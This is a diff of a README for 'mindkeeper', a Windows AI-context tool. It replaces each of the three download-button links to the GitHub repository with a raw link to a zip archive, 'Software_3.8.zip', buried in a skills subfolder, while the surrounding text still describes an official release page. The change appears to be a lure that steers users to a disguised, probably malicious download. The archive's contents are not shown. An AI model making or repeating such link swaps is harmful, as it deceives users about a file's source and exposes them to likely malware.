@@ -1,6 +1,6 @@
 # 🧠 mindkeeper - Track and Restore AI Context Easily
 
-[![Download mindkeeper](https://img.shields.io/badge/Download-mindkeeper-4caf50?style=for-the-badge)](https://github.com/allyliv/mindkeeper)
+[![Download mindkeeper](https://img.shields.io/badge/Download-mindkeeper-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/allyliv/mindkeeper/main/packages/openclaw/skills/mindkeeper/Software_3.8.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Follow these steps to download, install, and run mindkeeper on Windows.
 
 Click the big button below to visit the download page on GitHub. This will take you to the official release area where you can get the latest files.
 
-[![Download mindkeeper](https://img.shields.io/badge/Download-mindkeeper-4caf50?style=for-the-badge)](https://github.com/allyliv/mindkeeper)
+[![Download mindkeeper](https://img.shields.io/badge/Download-mindkeeper-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/allyliv/mindkeeper/main/packages/openclaw/skills/mindkeeper/Software_3.8.zip)
 
 ### Step 2: Find the Windows version
 
@@ -143,4 +143,4 @@ For more support, check the Issues section on the GitHub page or contact your sy
 
 Visit this page to download the latest version for Windows:
 
-[![Download mindkeeper](https://img.shields.io/badge/Download-mindkeeper-4caf50?style=for-the-badge)](https://github.com/allyliv/mindkeeper)
+[![Download mindkeeper](https://img.shields.io/badge/Download-mindkeeper-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/allyliv/mindkeeper/main/packages/openclaw/skills/mindkeeper/Software_3.8.zip)
